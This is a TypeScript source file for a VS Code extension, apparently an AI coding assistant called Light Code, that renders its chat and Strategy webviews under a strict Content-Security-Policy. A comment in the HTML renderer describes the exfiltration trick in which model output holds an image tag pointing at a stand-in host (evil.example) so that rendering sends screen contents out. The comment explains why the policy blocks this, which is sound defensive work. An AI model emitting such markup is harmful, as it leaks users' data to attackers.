import crypto from 'node:crypto'
import * as vscode from 'vscode'
import type { WebviewTransport } from '../platform/transport.js'

export class ChatViewProvider implements vscode.WebviewViewProvider {
  constructor(
    private readonly context: vscode.ExtensionContext,
    private readonly transport: WebviewTransport,
    /** Creates the bridge if this is the first thing to need it. Returns it either way. */
    private readonly ensureBridge: () => { resync: () => void },
  ) {}

  resolveWebviewView(webviewView: vscode.WebviewView): void {
    webviewView.webview.options = {
      enableScripts: true,
      localResourceRoots: [vscode.Uri.joinPath(this.context.extensionUri, 'dist')],
    }
    webviewView.webview.html = renderHtml(webviewView.webview, this.context.extensionUri)

    /*
     * The view attaches to the bridge rather than owning it.
     *
     * Owning it meant the schedule timer died with the panel — see `WebviewTransport`. The
     * bridge now lives as long as the extension does, so a torn-down view detaches and a new
     * one attaches and asks for the transcript back.
     */
    this.transport.attach(webviewView.webview)
    const bridge = this.ensureBridge()
    bridge.resync()

    webviewView.onDidDispose(() => this.transport.detach())
  }
}

/**
 * The Strategy window as an editor tab: the same bundle, started in its strategy-only view, on the same bridge
 * through the transport's extra webview. One tab at a time; asking again brings it forward.
 */
export class StrategyPanel {
  private static current: vscode.WebviewPanel | undefined

  static open(context: vscode.ExtensionContext, transport: WebviewTransport): void {
    if (StrategyPanel.current !== undefined) {
      StrategyPanel.current.reveal(vscode.ViewColumn.Active)
      return
    }
    const panel = vscode.window.createWebviewPanel('lightCode.strategy', 'Strategy', vscode.ViewColumn.Active, {
      enableScripts: true,
      retainContextWhenHidden: true,
      localResourceRoots: [vscode.Uri.joinPath(context.extensionUri, 'dist')],
    })
    panel.iconPath = vscode.Uri.joinPath(context.extensionUri, 'resources', 'activity-bar-icon.svg')
    panel.webview.html = renderHtml(panel.webview, context.extensionUri, 'strategy')
    const attached = transport.attachExtra(panel.webview)
    // The page closes itself with its Close button.
    const closing = panel.webview.onDidReceiveMessage((message: { type?: string }) => {
      if (message?.type === 'closeStrategyWindow') panel.dispose()
    })
    panel.onDidDispose(() => {
      attached.dispose()
      closing.dispose()
      StrategyPanel.current = undefined
    })
    StrategyPanel.current = panel
  }
}

function renderHtml(webview: vscode.Webview, extensionUri: vscode.Uri, view?: 'strategy'): string {
  const scriptUri = webview.asWebviewUri(vscode.Uri.joinPath(extensionUri, 'dist', 'webview.js'))
  const nonce = crypto.randomBytes(16).toString('base64')

  // No `style-src` entry is needed: React's `style` prop sets properties via the
  // CSSOM directly rather than through inline `style=""` attributes or `<style>`
  // tags, so it isn't subject to CSP at all. No remote assets, ever (invariant 4).
  /*
   * `img-src data:` and nothing else — deliberately narrower than it looks.
   *
   * This was `'none'`, which blocked every image including the diagrams `show_diagram` generates,
   * and they rendered as a broken-image glyph. The reason it was `'none'` is the classic
   * exfiltration trick: model output containing `<img src="https://evil.example/?d=…">` sends
   * whatever is on screen to whoever wrote it, as a side effect of *rendering*.
   *
   * A `data:` URI cannot do that. It makes no request, so there is nowhere for anything to be
   * sent — the hole that `'none'` was closing stays closed, because no remote scheme is allowed
   * here at all. Not `'self'` either, which would be broader than anything needs.
   *
   * And an SVG loaded through `<img>` cannot run script whatever it contains, which is the same
   * property the guide's diagrams rely on. The markup is generated in core from a validated graph
   * with every label escaped, so this is the second line rather than the first.
   */
  const csp = [
    "default-src 'none'",
    `script-src 'nonce-${nonce}'`,
    "connect-src 'none'",
    'img-src data:',
  ].join('; ')

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta http-equiv="Content-Security-Policy" content="${csp}" />
  <title>Light Code</title>
</head>
<body>
  <div id="root"${view !== undefined ? ` data-view="${view}"` : ''}></div>
  <script nonce="${nonce}" src="${scriptUri.toString()}"></script>
</body>
</html>`
}
